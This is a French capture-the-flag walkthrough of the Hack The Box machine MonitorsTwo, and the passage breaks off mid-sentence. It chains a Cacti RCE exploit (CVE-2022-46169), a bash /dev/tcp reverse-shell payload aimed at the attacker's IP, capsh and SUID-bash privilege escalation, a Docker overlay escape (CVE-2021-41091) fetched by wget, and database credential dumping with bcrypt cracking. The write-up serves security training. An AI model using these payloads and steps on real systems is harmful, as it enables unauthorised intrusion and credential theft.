
[{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rI- Vue d\u0026rsquo;ensemble de la machine: #\rMonitorsTwo est une machine Linux de difficulté facile. Elle met en avant quelques vulnérabilités et erreurs de configurations qui seront exploitées afin de prendre le contrôle du système suivant notre kill-chain ci-après:\nAccès Initial:\nUne première énumeration rapide nous permet de découvrir une application web vulnérable à une exécution de code à distance (RCE) avec pré-authentification via un en-tête X-Forwarded-For malveillant. L\u0026rsquo;exploitation de cette vulnérabilité débouche sur un shell au sein d\u0026rsquo;un conteneur Docker.\nÉlevation de privilèges (1): Un binaire capsh mal configuré avec le bit SUID activé permet un accès root à l\u0026rsquo;intérieur du conteneur.\nMouvement latéral: La découverte d\u0026rsquo;identifiants MySQL permet le dumping d\u0026rsquo;un hash, qui, une fois craqué, fournit un accès SSH à la machine.\nÉlevation de privilèges (2): Une énumération plus poussée révèle une version de Docker vulnérable qui permet à un utilisateur de faible privilège d\u0026rsquo;accéder aux systèmes de fichiers des autres conteneurs montés. En tirant parti de l\u0026rsquo;accès root dans le conteneur, un binaire bash avec le bit SUID activé sera copié, afin d\u0026rsquo;obtenir une élévation de privilèges sur l\u0026rsquo;hôte.\nII- Collecte d\u0026rsquo;informations: #\rScan de ports Nmap #\r┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.211 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti |_http-server-header: nginx/1.18.0 (Ubuntu) Informations utiles:\nServeur web nginx 1.18.0 en écoute, pouvant être un portail de connexion. Serveur SSH en mode écoute (nous auront besoin d\u0026rsquo;identifiants valides pour y accéder). III- Accès Initial #\rPage d\u0026rsquo;accueil :\nNous avons la version de l\u0026rsquo;application Cacti 1.2.22 il s\u0026rsquo;agira donc de chercher l\u0026rsquo;existence de vulnérabilités connues sur cette version:\nIl en ressort plusieurs références pour la même vulnérabilité de type RCE: CVE-2022-46169\nVulnérabilité: L\u0026rsquo;exploit consiste à accéder à l\u0026rsquo;endpoint vulnérable /remote_agent.php, dont l\u0026rsquo;authentification peut être contournée en raison d\u0026rsquo;une implémentation faible de la fonction get_client_addr qui utilise un en-tête contrôlé par l\u0026rsquo;utilisateur, nommément X-Forwarded-For, pour authentifier le client. Une fois que cette vérification initiale est contournée, nous déclencherons ensuite la fonction poll_for_data via l\u0026rsquo;action polldata, qui est vulnérable à l\u0026rsquo;injection de commande via le paramètre $poller_id qui est passé à proc_open, qui est une fonction PHP qui exécute des commandes système.\nEssayons donc ce PoC:\n# Nous allons configurer un listenner notament nc: ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$ nc -lvnp 1337 listening on [any] 1337 ... # clonage du repo github: ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$ sudo git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22 Cloning into \u0026#39;CVE-2022-46169-CACTI-1.2.22\u0026#39;... remote: Enumerating objects: 18, done. remote: Counting objects: 100% (18/18), done. remote: Compressing objects: 100% (16/16), done. remote: Total 18 (delta 4), reused 4 (delta 1), pack-reused 0 Receiving objects: 100% (18/18), 5.07 KiB | 2.53 MiB/s, done. Resolving deltas: 100% (4/4), done. ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22] └─$ cd CVE-2022-46169-CACTI-1.2.22/ ┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22] └─$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.xx.xx --LPORT=1337 Checking... The target is vulnerable. Exploiting... Bruteforcing the host_id and local_data_ids Bruteforce Success!! # Obtention du reverse shell: ┌──(raizen㉿Raizen)-[~] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 39056 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Simple et efficace !\nIV- Élevation de privilèges (1) #\rAprès avoir examiné divers répertoires et fichiers, rien de particulièrement intéressant n\u0026rsquo;est apparu. La seule chose à noter est que nous sommes actuellement dans un conteneur Docker, comme le suggère la présence du fichier /.dockerenv, ce qui est également confirmé par notre nom d\u0026rsquo;hôte, à savoir www-data@50bca5e748b0:\nwww-data@50bca5e748b0:/var/www/html$ ls -la / total 88 drwxr-xr-x 1 root root 4096 Mar 21 2023 . drwxr-xr-x 1 root root 4096 Mar 21 2023 .. -rwxr-xr-x 1 root root 0 Mar 21 2023 .dockerenv drwxr-xr-x 1 root root 4096 Mar 22 2023 bin Nous pouvons vérifier s\u0026rsquo;il y a quelque chose d\u0026rsquo;intéressant qui peut être exécuté avec des privilèges élevés notament tous les fichiers sur le système de fichiers qui ont l\u0026rsquo;attribut setuid (suid) activé.\nwww-data@50bca5e748b0:/var/www/html$ find / -type f -perm -u=s 2\u0026gt;/dev/null find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su Le binaire capsh semble convenir à ce que je cherche. En effectuant une recherche rapide sur GTFOBins (un site incontournable qui répertorie une liste de binaires Unix pouvant être utilisés pour contourner les restrictions de sécurité locale dans des systèmes mal configurés) nous obtenons ceci :\nSuivons donc les directives de GTFOBins :\nwww-data@50bca5e748b0:/var/www$ /sbin/capsh --gid=0 --uid=0 -- /sbin/capsh --gid=0 --uid=0 -- id uid=0(root) gid=0(root) groups=0(root),33(www-data) Et ainsi j\u0026rsquo;obtiens les droits root. Cependant nous n\u0026rsquo;avons pas encore trouvé notre flag puisse que nous sommes toujours dans le conteneur docker.\nV- Mouvement latérral #\rLorsque nous listons les fichiers dans le répertoire racine (/), nous voyons un script appelé entrypoint.sh:\nls -l total 76 drwxr-xr-x 1 root root 4096 Mar 22 2023 bin drwxr-xr-x 2 root root 4096 Mar 22 2023 boot drwxr-xr-x 5 root root 340 Jan 25 14:34 dev -rw-r--r-- 1 root root 648 Jan 5 2023 entrypoint.sh \u0026lt;SNIP\u0026gt; Vérifions donc son contenu:\nwww-data@50bca5e748b0:/$ cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo \u0026#34;database is connected\u0026#34; if [[ ! $(mysql --host=db --user=root --password=root cacti -e \u0026#34;show tables\u0026#34;) =~ \u0026#34;automation_devices\u0026#34; ]]; then mysql --host=db --user=root --password=root cacti \u0026lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e \u0026#34;UPDATE user_auth SET must_change_password=\u0026#39;\u0026#39; WHERE username = \u0026#39;admin\u0026#39;\u0026#34; mysql --host=db --user=root --password=root cacti -e \u0026#34;SET GLOBAL time_zone = \u0026#39;UTC\u0026#39;\u0026#34; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ \u0026#34;${1#-}\u0026#34; != \u0026#34;$1\u0026#34; ]; then set -- apache2-foreground \u0026#34;$@\u0026#34; fi exec \u0026#34;$@\u0026#34; Nous voyons plusieurs commandes mysql exécutées en tant que root. Le script révèle également que le nom d\u0026rsquo;utilisateur admin existe et que le champ lié au mot de passe must_change_password est présent dans la table user_auth.\n$ mysql --host=db --user=root --password=root cacti -e \u0026#34;SELECT * FROM user_auth\u0026#34; id username password realm full_name email_address must_change_password password_change show_tree show_list show_preview graph_settings login_opts policy_graphs policy_trees policy_hosts policy_graph_templates enabled lastchange lastlogin password_history locked failed_attempts lastfail reset_perms 1 admin $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC 0 Jamie Thompson admin@monitorstwo.htb 1 on on on on on 2 11 1 1 on -1 -1 -1 0 0 663348655 3 guest 43e9a4ab75570f5b 0 Guest Account on on on on on 3 1 1 1 1 1 -1 -1-1 0 0 0 4 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 0 Marcus Brune marcus@monitorstwo.htb on on on on 1 11 1 1 on -1 -1 on 0 0 2135691668 Nous obtenons ainsi les identifiants des utilisateurs admin et marcus :\nadmin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C Essayons de cracker ces identifiants sur notre machine d\u0026rsquo;attaque en utilisant john:\n┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo] └─$ cat hashes.txt $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C ┌──(raizen㉿Raizen)-[~] └─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 16 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status funkymonkey (?) Ainsi nous avons les identifiants de marcus:funkymonkey.Il ne reste plus qu\u0026rsquo;àeaayer de se connecter via ssh à notre cible et obtenir notre premier flag:\n┌──(marcus㉿monitorstwo)-[~] └─$ssh marcus@10.10.11.211 ┌──(marcus㉿monitorstwo)-[~] └─$ cat user.txt \u0026lt;********************************\u0026gt; VI- Élevation de privilèges (2) #\rAprès fait le tour des répertoires et fichiers, nous trouvons finallement quelque chose d\u0026rsquo;intéressant :\n┌──(marcus㉿monitorstwo)-[/var] └─$ cat mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team En gros ce mail écrit par l\u0026rsquo;administrateur de monitorstwo.htb est destinée à tous les utilisateurs du système et aborde principalement trois vulnérabilités récemment découvertes qui nécessitent une attention immédiate. Nous alllons donc investiguer ces trois vulns et voir s\u0026rsquo;il y en a un que nous pourrons exploiter pour avancer dans notre tâche.\nLa première, CVE-2021-33033 concerne les versions du noyau antérieures à 5.11.14, voyons donc ce que nous avons actuellement : marcus@monitorstwo:/var$ uname -a Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux Bien que cela semble être une version obsolète, la série de versions 5.4 est en fait la dernière selon la documentation officielle:\nLa seconde CVE-2020-25706 fait référence à une vulnérabilité XSS pour Cacti 1.2.13 or la version de l\u0026rsquo;application cible est Cacti 1.2.22. -Il ne nous reste que la dernière vuln : CVE-2021-41091, qui concerne le Docker engine, nommé Moby version 20.10.9. Ce qui nous arrangerait compte tenu de l\u0026rsquo;environnement où nous somme actuellement.\nUne vérification de la version de docker nous permet de voir qu\u0026rsquo;il s\u0026rsquo;agit de la version 20.10.5 qui est spoiller alert vulnérable:\n┌──(marcus㉿monitorstwo)-[/var] └─$ docker --version Docker version 20.10.5+dfsg1, build 55c4c88 Nous devrions donc pouvoir exploiter ce CVE. Après quelques recherches, nous tombons sur ce POC.\nVulnérabilité: Plusieurs répertoires dans /var/lib/docker, qui sont montés et utilisés par les conteneurs Docker, sont accessibles aux utilisateurs à faible privilèges. Cela implique que si un attaquant obtient l\u0026rsquo;accès root à l\u0026rsquo;intérieur d\u0026rsquo;un conteneur, il pourrait créer des fichiers SUID arbitraires avec lesquels un utilisateur non privilégié à l\u0026rsquo;extérieur du conteneur pourrait interagir et utiliser pour une élevation de privilèges.\nCe que nous devons donc faire :\n1- Répéter notre processus initial pour obtenir un accès RCE et une élévation de privilèges via le binaire capsh en utilisant CVE-2022-46169.\n2- Attribuer les permissions appropriées au binaire bash avec la commande chmod u+s /bin/bash.\n3- Cloner le PoC du CVE-2021-41091 sur notre machine d\u0026rsquo;attaque, transférer le script bash (exp.sh) sur la cible en utilisant le compte marcus via SSH, et l\u0026rsquo;exécuter en utilisant l\u0026rsquo;utilisateur marcus.\nRépétons notre accès initial puis obtenons les droits root à l\u0026rsquo;intérieur du conteneur :\n# obtention des droits root à l\u0026#39;intérieur du conteneur whoami root id uid=0(root) gid=0(root) groups=0(root),33(www-data) # attribution des permissions SUID au binaire bash chmod u+s /bin/bash Depuis notre machine d\u0026rsquo;attaque :\n```bash\r# clonage du repo vers ma machine\r$ sudo git clone https://github.com/UncleJ4ck/CVE-2021-41091\r[sudo] password for kali:\rCloning into 'CVE-2021-41091'...\rremote: Enumerating objects: 25, done.\rremote: Counting objects: 100% (25/25), done.\rremote: Compressing objects: 100% (23/23), done.\rremote: Total 25 (delta 6), reused 3 (delta 0), pack-reused 0\rReceiving objects: 100% (25/25), 6.95 KiB | 6.96 MiB/s, done.\rResolving deltas: 100% (6/6), done.\r# move within the directory\r$ cd CVE-2021-41091/\r# checking permissions\r$ ls -l\rtotal 8\r-rwxr-xr-x 1 root root 2446 Jan 25 18:18 exp.sh\r-rw-r--r-- 1 root root 2616 Jan 25 18:18 README.md\r# start a Python HTTP server\r$ python3 -m http.server\rServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\r10.10.11.211 - - [25/Jan/2024 18:19:47] \u0026quot;GET /exp.sh HTTP/1.1\u0026quot; 200 -\r```\rDepuis le terminal de marcus:\n# Téléchargement du script ┌──(marcus㉿monitorstwo)-[~] └─$ wget http://10.10.xx.xx:8000/exp.sh --2024-01-25 18:19:47-- http://10.10.xx.xx:8000/exp.sh Connecting to 10.10.14.33:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 2446 (2.4K) [text/x-sh] Saving to: ‘exp.sh’ exp.sh 100%[========================\u0026gt;] 2.39K --.-KB/s in 0s 2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446] # Attribution de la permission d\u0026#39;exécution\r┌──(marcus㉿monitorstwo)-[~]\r└─$ chmod +x exp.sh # Vérification des permissions\r┌──(marcus㉿monitorstwo)-[~]\r└─$ ls -l exp.sh\rtotal 8\r-rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh # Exécution du script\r┌──(marcus㉿monitorstwo)-[/var]\r└─$ ./exp.sh\r[!] Vulnerable to CVE-2021-41091\r[!] Now connect to your Docker container that is accessible and obtain root access !\r[\u0026gt;] After gaining root access execute this command (chmod u+s /bin/bash)\rDid you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes\r[!] Available Overlay2 Filesystems:\r/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\r/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[!] Iterating over the available Overlay2 filesystems !\r[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\r[x] Could not get root access in \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\u0026#39;\r[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[!] Rooted !\r[\u0026gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[?] If it didnt spawn a shell go to this path and execute \u0026#39;./bin/bash -p\u0026#39;\r[!] Spawning Shell\rbash-5.1# exit Direction vers le \u0026ldquo;Current Vulnerable Path\u0026rdquo; mentionné ci-dessus ┌──(marcus㉿monitorstwo)-[~]\r└─$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r# Éxécution de la commande \u0026#39;./bin/bash -p\u0026#39; pour lancer l\u0026#39;interpréteur en ``privileged mode``\r$ ./bin/bash -p\rbash-5.1# id\ruid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)\rbash-5.1# cat /root/root.txt\r\u0026lt;********************************\u0026gt; Pwned 🗹 #\rAinsi s\u0026rsquo;achève notre mission ;) VII- Extra - IppSec’s Exploit #\rCette section fera office d\u0026rsquo;ouverture et sera basé sur la vidéo de IppSec\u0026rsquo;s video walkthrough où l\u0026rsquo;exploitation est réalisé de façon manuelle. On apprend toujours de nouvelles méthodologies et astuces dans ses vidéos donc ça vaut le détour.\nAccès Initial #\rNous réaliserons l\u0026rsquo;exploitation du CVE-2022-46169 en se basant sur le post de Rapid7) de façon manuelle:\nSi les paramètres LOCAL_DATA_ID et/ou HOST_ID ne sont pas définis, le module tentera de forcer la valeur (ou les valeurs) manquante(s). Si une combinaison valide est trouvée, le module utilisera ces valeurs pour tenter l\u0026rsquo;exploitation. Si LOCAL_DATA_ID et/ou HOST_ID sont tous les deux définis, le module tentera immédiatement l\u0026rsquo;exploitation. Pendant l\u0026rsquo;exploitation, le module envoie une requête GET à /remote_agent.php avec le paramètre d\u0026rsquo;action défini sur polldata et l\u0026rsquo;en-tête X-Forwarded-For défini sur la valeur fournie pour X_FORWARDED_FOR_IP (par défaut 127.0.0.1). WNous pouvons commencer par intercepter une requête via Burp, par exemple, une requête de connexion POST en utilisant des identifiants aléatoires, changer la méthode HTTP en requête GET et l\u0026rsquo;URL en /remote_agent.php?action=polldata\u0026amp;local_data_ids[]={local_data_ids}\u0026amp;host_id={host_id}\u0026amp;poller_id=1{payload}``.\nLe chemin d\u0026rsquo;URL peut être trouvé ici:\nNous recevons l\u0026rsquo;erreur FATAL: You are not authorized to use this service. Commençons par ajouter l\u0026rsquo;en-tête X-Forwarded-For avec la valeur localhost et voyons ce qui se passe.\nCette fois, nous n\u0026rsquo;avons pas reçu d\u0026rsquo;erreur FATAL, mais une erreur de Validation concernant le paramètre host_id. Supprimons les variables, définissons tous les identifiants sur 1, et essayons un payload simple, telle que sleep 5.\nLe payload sleep+5 est la version URL-encodée de la charge utile sleep 5.\nNous n\u0026rsquo;avons reçu aucune erreur en retour, mais la charge utile n\u0026rsquo;a pas fonctionné non plus. Cela est logique car, selon la description de la vulnérabilité :\nSi une combinaison valide est trouvée, le module utilisera ces informations pour tenter l\u0026rsquo;exploitation\nAinsi, nous devons effectuer une attaque par brute force sur les paramètres local_data_id et host_id jusqu\u0026rsquo;à ce que nous trouvions une combinaison valide de valeurs qui permettra à notre charge utile de fonctionner. Nous pouvons l\u0026rsquo;automatiser en utilisant l\u0026rsquo;outil Intruder :\nLes deux charges utiles 1 et 2 sont définies comme une liste séquentielle de nombres de 1 à 10\nIntruder montre qu\u0026rsquo;une seule combinaison de charges utiles a entraîné un délai de 5 secondes (causé par notre charge utile sleep+5) : local_data_ids[]=6 et host_id=1 ! Vérifions cela manuellement : Ce qui se passe ici, c\u0026rsquo;est que certaines valeurs du paramètre rdd_name de la réponse HTTP sont exploitables : uptime en est une (nous pouvons trouver la liste complète des paramètres exploitables ici. Donc, nous effectuons une attaque par force brute sur les paramètres local_data_id et host_id jusqu\u0026rsquo;à ce qu\u0026rsquo;une combinaison d\u0026rsquo;entre eux renvoie l\u0026rsquo;un des paramètres exploitables dans la réponse :\nMaintenant que nous avons trouvé la bonne combinaison de valeurs de paramètres, nous pouvons envoyer du code (ici un reverse shell) en tant que charge utile: bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/1337 0\u0026gt;\u0026amp;1'; L\u0026rsquo;encoder en URL (en appuyant sur CTRL+U) puis mettre en place sur notre machine d\u0026rsquo;attaque un Listener (netcat en mode écoute) et envoyer la requête :\n# listener nc ┌──(raizen㉿Raizen)-[~] └─$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.xx.xx] 36722 # Obtention du shell inversé ┌──(raizen㉿Raizen)-[~] └─$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 36722 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Mouvement latéral #\rIdéalement, nous devrions d\u0026rsquo;abord stabiliser notre shell. Python n\u0026rsquo;est pas installé sur la cible, donc nous ne pouvons pas utiliser le module pty(python3 import pty;pty.spawn'(\u0026quot;/bin/bash\u0026quot;)') pour y parvenir. Cependant, nous pouvons utiliser script :\n# Stabilisation du shell avec script www-data@50bca5e748b0:/var/www/html$ which script which script /usr/bin/script www-data@50bca5e748b0:/var/www/html$ script -O /dev/null -q /bin/bash script -O /dev/null -q /bin/bash $ bash bash # Mise en arrière plan de la connexion www-data@50bca5e748b0:/var/www/html$ ^Z [1]+ Stopped nc -lvnp 1337 # Remise en avant plan dans notre shell ┌──(raizen㉿Raizen)-[~] └─$ stty raw -echo; fg nc -lvnp 1337 www-data@50bca5e748b0:/var/www/html$ Maintenant, nous devons obtenir les valeurs des variables rows(lignes) et cols(colonnes) depuis notre machine d\u0026rsquo;attaque :\n┌──(raizen㉿Raizen)-[~] └─$ stty -a speed 38400 baud; rows 51; columns 209; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = \u0026lt;undef\u0026gt;; eol2 = \u0026lt;undef\u0026gt;; swtch = \u0026lt;undef\u0026gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc Et enfin, nous devons définir les mêmes valeurs sur notre machine cible :\nwww-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209 www-data@50bca5e748b0:/var/www/html$ export TERM=xterm Nous avons maintenant notre point d\u0026rsquo;entrée initial avec un shell bash approprié ! Étant donné que c\u0026rsquo;est un serveur d\u0026rsquo;application web, nous devrons probablement vérifier les fichiers de configuration de la base de données :\n# Recherche de fichiers de configuration www-data@50bca5e748b0:/var/www/html$ find . | grep config ./include/config.php ./docs/images/graphs-edit-nontemplate-configuration.png ./docs/apache_template_config.html # Recherche de chaînes de caractères liées à la base de données dans le fichier de configuration www-data@50bca5e748b0:/var/www/html$ grep database include/config.php * Make sure these values reflect your actual database/host/user/password $database_type = \u0026#39;mysql\u0026#39;; $database_default = \u0026#39;cacti\u0026#39;; $database_hostname = \u0026#39;db\u0026#39;; $database_username = \u0026#39;root\u0026#39;; $database_password = \u0026#39;root\u0026#39;; $database_port = \u0026#39;3306\u0026#39;; $database_retries = 5; $database_ssl = false; $database_ssl_key = \u0026#39;\u0026#39;; $database_ssl_cert = \u0026#39;\u0026#39;; $database_ssl_ca = \u0026#39;\u0026#39;; $database_persist = false; #$rdatabase_type = \u0026#39;mysql\u0026#39;; #$rdatabase_default = \u0026#39;cacti\u0026#39;; #$rdatabase_hostname = \u0026#39;localhost\u0026#39;; #$rdatabase_username = \u0026#39;cactiuser\u0026#39;; #$rdatabase_password = \u0026#39;cactiuser\u0026#39;; #$rdatabase_port = \u0026#39;3306\u0026#39;; #$rdatabase_retries = 5; #$rdatabase_ssl = false; #$rdatabase_ssl_key = \u0026#39;\u0026#39;; #$rdatabase_ssl_cert = \u0026#39;\u0026#39;; #$rdatabase_ssl_ca = \u0026#39;\u0026#39;; * Save sessions to a database for load balancing * are defined in lib/database.php Le fichier de configuration ci-dessus contient tout ce dont nous avons besoin pour nous connecter au serveur de base de données :\n# Connexion au serveur mysql www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 221 Server version: 5.7.40 MySQL Community Server (GPL) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. # Listage des bases de données MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | cacti | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.002 sec) # Selection de la base de donnée: MySQL [(none)]\u0026gt; use cacti; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed # Listage des tables de bases de données MySQL [cacti]\u0026gt; show tables; +-------------------------------------+ | Tables_in_cacti | +-------------------------------------+ \u0026lt;SNIP\u0026gt; | user_auth | | user_auth_cache | | user_auth_group | | user_auth_group_members | | user_auth_group_perms | | user_auth_group_realm | | user_auth_perms | | user_auth_realm | | user_domains | | user_domains_ldap | | user_log | | vdef | | vdef_items | | version | +-------------------------------------+ 111 rows in set (0.001 sec) # Extraction de la première ligne de la table pour énumérer ses champs MySQL [cacti]\u0026gt; SELECT * FROM user_auth LIMIT 1 \\G; *************************** 1. row *************************** id: 1 username: admin password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC realm: 0 full_name: Jamie Thompson email_address: admin@monitorstwo.htb must_change_password: password_change: on show_tree: on show_list: on show_preview: on graph_settings: on login_opts: 2 policy_graphs: 1 policy_trees: 1 policy_hosts: 1 policy_graph_templates: 1 enabled: on lastchange: -1 lastlogin: -1 password_history: -1 locked: failed_attempts: 0 lastfail: 0 reset_perms: 663348655 1 row in set (0.000 sec) ERROR: No query specified -Nous pouvons déjà y trouver les information de connexion sur le compte ``admin`` # selection des champs qui nous intéressent (noms et mots de passe): MySQL [cacti]\u0026gt; SELECT username, password FROM user_auth ; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | admin | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | | guest | 43e9a4ab75570f5b | | marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | +----------+--------------------------------------------------------------+ 3 rows in set (0.001 sec) Le modificateur \\G dans le client de ligne de commande MySQL.\nNous pouvons maintenant essayer de cracker ces hash sur notre machine en utilisant d\u0026rsquo;abord le mode de détection automatique de hashcat pour déterminer le type de hachage :\n┌──(raizen㉿Raizen)-[~] └─$ cat hashes admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C # En utilisant le mode d\u0026#39;auto detection ┌──(raizen㉿Raizen)-[~] └─$ hashcat hashes /usr/share/wordlists/rockyou.txt --username hashcat (v6.2.6) starting in autodetect mode \u0026lt;SNIP\u0026gt; The following 4 hash-modes match the structure of your input hash: # | Name | Category ======+============================================================+======================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce Please specify the hash-mode with -m [hash-mode]. Started: Fri Jan 26 06:42:36 2024 Stopped: Fri Jan 26 06:42:38 2024 Nos hash commencent par $2y$, ce qui correspond mieux au format bcrypt de la category operating system. Nous choisirons donc le mode 3200 dans hashcat.\n┌──(raizen㉿Raizen)-[~] └─$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username \u0026lt;SNIP\u0026gt; $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =\u0026gt; s Session..........: hashcat Status...........: Running Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix)) Hash.Target......: hashes Time.Started.....: Fri Jan 26 06:46:23 2024 (7 mins, 57 secs) Time.Estimated...: Tue Jan 30 09:23:44 2024 (4 days, 2 hours) En moins 